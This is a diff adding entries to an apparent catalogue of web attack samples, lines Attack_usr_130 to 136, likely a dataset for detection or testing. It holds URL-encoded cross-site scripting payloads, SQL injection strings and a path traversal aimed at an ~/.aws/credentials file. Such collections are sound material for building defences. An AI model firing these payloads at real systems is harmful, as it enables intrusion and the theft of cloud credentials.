@@ -240,3 +240,7 @@ Categories of Web Attacks (50 Categories)
 241. Attack_usr_130: ?b87e1eadb1=sometext%3Csvg%20onload=alert%28document.domain%29%3E%3FmimeType=text%2Fhtml
 242. Attack_usr_131: ?34ea04b04c=%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E
 243. Attack_usr_132: ?ca6100de82=-1134%27%29%20%20OR%20JSON_EXTRACT%28%27%7B%27%27aKER%27%27:%209648%7D%27%2C%20%27$.aKER%27%29%20=%209648%2A7799%20AND%20%28%27QlYa%27%20LIKE%20%27QlYa
+244. Attack_usr_133: ?data=OltZJE7ZaPSLmXQJ5%2FpwgCMm%2Fkvon8HP9lmYJYHd6HGZj%2B1z6iPdTo2fAXFQjYu0uZBNAu5xKRVr1O8ayHk17emcTGlFS68UMh68sxuqrvU0c%2BsoUl9SZexU9E0ZFMryS6MuYuOlmCWzObu1S4zC9gdIZQe4voy%2Fn%2Fg4Joi7%2F0PVlz42BqHvOPJJ3GqdwNPWMtwlvGTX%2BnGXp6XhTnWQVAKjSmMWrfancspix9hJfuLtGqBXkszHCpNPvruc8shpHI4F%2FQMg0dO6cMvHYDqWadZVf68MPcP63pxKWklF8NXRmqzIa1fKuV0%3D&signature=6ce4e8ca1b6a6c2a7ecf58b6a7c2355b&subChannelCode=VBA&%3Cscript%3Ealert(1)%3C/script%3E
+245. Attack_usr_134: ?module=logging&file_name=../../../../../../~/.aws/credentials&number_of_lines=10000
+246. Attack_usr_135: /?q=%27admin%20%27OR%20%271%27=%271%27;-- Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+247. Attack_usr_136: /?q=%3Cscript%3Ealert(1)%3C/script%3E Accept: */*
